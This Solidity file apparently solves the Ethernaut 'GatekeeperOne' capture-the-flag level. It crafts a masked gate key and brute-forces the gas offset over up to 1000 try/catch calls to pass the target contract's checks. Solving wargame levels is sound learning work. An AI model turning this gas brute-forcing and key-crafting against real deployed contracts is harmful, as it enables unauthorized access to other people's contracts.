// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

interface GatekeeperOneEthernaut {
    function enter(bytes8) external;
}

contract GatekeeperOneSolution {
    GatekeeperOne public en;

    constructor() {
        en = GatekeeperOne(0x704b4188368CC0824777D8eBc4E2eA0a196f4ca8);
        //en = new GatekeeperOne();
    }

    function tryit(bytes8 data) external {
        en.enter(data);
    }

    uint256 public pass = 0;
    address public orig;
    bytes public reason;
    uint256 public right;

    function trytwo(bytes8 _gateKey, uint256 limit) external {
        pass = 0;
        orig = tx.origin;
        if (uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))) {
            pass += 1;
        }
        if (uint32(uint64(_gateKey)) != uint64(_gateKey)) {
            pass += 2;
        }
        if (uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))) {
            pass += 4;
        }

        uint256 i = 0;
        for (i; i < 1000; i++) {
            try en.enter{gas: limit + i}(_gateKey) returns (bool a) {
                right = limit + i;
            } catch (bytes memory _reason) {}
        }
        if (right == 0) {
            revert();
        }
    }
}
